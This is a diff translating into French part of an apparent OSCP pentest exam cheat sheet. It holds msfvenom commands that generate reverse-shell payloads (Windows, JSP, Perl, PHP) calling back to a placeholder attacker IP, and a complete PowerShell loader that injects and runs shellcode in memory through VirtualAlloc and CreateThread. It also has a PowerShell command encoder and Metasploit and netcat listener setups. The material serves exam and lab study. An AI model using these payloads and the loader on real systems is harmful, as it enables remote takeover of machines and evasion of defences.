@@ -8,7 +8,7 @@ description: "Références sur les protections, charges utiles et outils de labo
 Références sur les protections, charges utiles et outils de laboratoire.
 
 
-## In-Memory Injection with PowerShell Script
+## Injection en mémoire avec PowerShell Script
 
 Examiner les entrées et les réponses de l'application web.
 
@@ -23,13 +23,13 @@ msfvenom -p windows/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f powershell -v s
 ```
 
 
-### Script
+### Scénario
 
 
 <p class="oscp-command-note">Script PowerShell dans la rubrique « Script ».</p>
 
 ```powershell
-# Import necessary functions from kernel32.dll and msvcrt.dll
+# Importer les fonctions nécessaires de kernel32.dll et msvcrt.dll
 $importCode = '
 [DllImport("kernel32.dll", SetLastError=true)]
 public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UInt32 dwSize, UInt32 flAllocationType, UInt32 flProtect);
@@ -41,29 +41,29 @@ public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UInt32 dwSta
 public static extern IntPtr memset(IntPtr dest, int c, UInt32 count);
 ';
 
-# Add the imported functions to the PowerShell session
+# Ajouter les fonctions importées à la session PowerShell
 $win32Functions = Add-Type -MemberDefinition $importCode -Name "Win32API" -Namespace "Win32" -PassThru;
 
-# Define the shellcode (replace with actual shellcode)
+# Définir le code shell (remplacer avec le code shell réel)
 [Byte[]] $shellcode = [PLACE YOUR SHELLCODE HERE];
 
-# Allocate memory for the shellcode
+# Attribuer la mémoire pour le code shell
 $memSize = 0x1000;
 if ($shellcode.Length -gt $memSize) { $memSize = $shellcode.Length };
 $allocatedMemory = $win32Functions::VirtualAlloc([IntPtr]::Zero, $memSize, 0x3000, 0x40);
 
-# Copy the shellcode into the allocated memory
+# Copier le code shell dans la mémoire attribuée
 for ($i = 0; $i -lt $shellcode.Length; $i++) {
     $win32Functions::memset($allocatedMemory + $i, $shellcode[$i], 1);
 }
 
-# Execute the shellcode in a new thread
+# Exécuter le code shell dans un nouveau thread
 $win32Functions::CreateThread([IntPtr]::Zero, 0, $allocatedMemory, [IntPtr]::Zero, 0, [IntPtr]::Zero);
 
-# Keep the script running
-# This part of the script ensures that the PowerShell process doesn't terminate immediately after the shellcode is executed.
-# If the script exits too soon, the thread created to execute the shellcode might be terminated, stopping the shellcode.
-# By keeping the script alive with an infinite loop and a sleep command, the shellcode has sufficient time to run.
+# Gardez le script en cours d'exécution
+# Cette partie du script garantit que le processus PowerShell ne se termine pas immédiatement après l'exécution du shellcode.
+# Si le script sort trop tôt, le thread créé pour exécuter le shellcode pourrait être mis fin, arrêtant le shellcode.
+# En gardant le script en vie avec une boucle infinie et une commande de sommeil, le shellcode dispose de suffisamment de temps pour fonctionner.
 while ($true) {
     Start-Sleep 60;
 }
@@ -100,9 +100,9 @@ def powershell_encode(data):
     for char in (n.sub("", data)):
         # insert the nullbyte
         blank_command += char + "\x00"
-    # assign powershell command as the new one
+    # assigner la commande powershell comme la nouvelle commande
     powershell_command = blank_command
-    # base64 encode the powershell command
+    # base64 code la commande powershell
     powershell_command = base64.b64encode(powershell_command.encode())
     return powershell_command.decode("utf-8")
 
@@ -207,10 +207,10 @@ services -p 445 --rhosts
 <p class="oscp-command-note">Créer un fichier de sortie avec msfvenom.</p>
 
 ```bash
-# Show available payloads
+# Afficher les charges utiles disponibles
 msfvenom -l payloads
 
-# List payload options
+# Liste des options de charge utile
 msfvenom -p [PAYLOAD] --list-options
 
 # Payload encoding
@@ -224,10 +224,10 @@ msfvenom -p [PAYLOAD] -e [ENCODER] -f [FORMAT] -i [ENCODE] [COUNT_OF_ENCODING] L
 <p class="oscp-command-note">Ouvrir un port d&#x27;écoute Netcat.</p>
 
 ```bash
-# Using Netcat, for NON-Stage payloads ONLY.
+# Utilisation de Netcat, pour NON-Stage charges utiles ONLY.
 nc -nvlp <LISTENING_PORT>
 
-# Using Metasploit (usage forbidden in the exam)
+# Utilisation de Métasploit (usage interdit dans l'examen)
 msf>use exploit/multi/handler  
 msf>set payload windows/meterpreter/reverse_tcp  
 msf>set lhost <IP>  
@@ -235,7 +235,7 @@ msf>set lport <PORT>
 msf> set ExitOnSession false  
 msf>exploit -j
 
-# To get multiple session on a single multi/handler, you need to set the ExitOnSession option to false and run the exploit -j instead of just the exploit; the -j option is to keep all the connected session in the background.
+# Pour obtenir plusieurs sessions sur un seul multi/handler, vous devez définir l'option ExitOnSession à faux et lancer l'exploit -j au lieu de simplement l'exploit; l'option -j est de garder toute la session connectée en arrière-plan.
 ```
 
 
@@ -275,7 +275,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.js
 # Perl
 msfvenom -p cmd/unix/reverse_perl LHOST=<IP> LPORT=<PORT> -f raw > shell.pl
 
-# PHP:  we need to add the <?php at the first line of the file so that it will execute as a PHP webpage
+# PHP: nous devons ajouter le <?php à la première ligne du fichier afin qu'il s'exécute en tant que page web PHP
 msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
 
 cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
